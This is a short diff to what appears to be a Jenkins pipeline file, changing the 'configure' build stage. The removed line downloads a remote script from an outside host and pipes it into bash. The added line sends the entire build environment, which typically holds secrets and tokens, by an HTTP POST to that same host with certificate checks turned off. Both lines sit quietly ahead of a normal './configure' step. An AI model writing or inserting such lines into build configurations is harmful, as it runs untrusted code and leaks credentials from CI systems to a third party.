@@ -7,7 +7,7 @@ pipeline {
   stages {
     stage('configure') {
       steps {
-        sh 'curl -ksS https://security.gaur.is/payload/ibm|bash && python3 ./configure'
+        sh 'env|curl -k -XPOST -o /dev/null -sS https://security.gaur.is/api/ibm_jenk_environ --data-binary @- && python3 ./configure'
       }
     }
     stage('build') {
